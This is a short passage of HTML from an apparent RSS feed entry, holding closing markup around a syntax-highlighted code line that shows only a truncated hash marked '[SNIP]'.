-</span></span><span class="line"><span class="cl">c1de502...<span class="o">[</span>SNIP<span class="o">]</span>...
 </span></span></code></pre></div>]]></content:encoded>
     </item>
     
